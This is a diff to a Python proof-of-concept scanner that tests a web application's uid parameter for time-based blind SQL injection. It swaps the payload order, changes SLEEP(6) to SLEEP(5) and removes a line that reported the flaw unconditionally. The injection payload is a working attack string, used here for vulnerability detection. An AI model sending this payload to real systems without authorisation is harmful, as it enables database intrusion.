@@ -31,8 +31,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            payload1 = "/accounts/username_check1/?gid=1&cn=test1ees&pwd=111111&sid=0&uid=1"
-            payload2 = "/accounts/username_check1/?gid=1&cn=test1ees&pwd=111111&sid=0&uid=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23"
+            payload1 = "/accounts/username_check1/?gid=1&cn=test1ees&pwd=111111&sid=0&uid=1) AND (SELECT * FROM (SELECT(SLEEP(5)))test) AND 'wooyun'='wooyun'%23"
+            payload2 = "/accounts/username_check1/?gid=1&cn=test1ees&pwd=111111&sid=0&uid=1"
             url = self.target + payload1
             url2 = self.target + payload2
             start_time = time.time()
@@ -42,8 +42,6 @@ class Poc(ABPoc):
             end_time2 = time.time()
             if (end_time1-start_time) - (end_time2-end_time1) > 5:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
-            
-            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
         except Exception, e:
             self.output.info('执行异常：{}'.format(e))
 
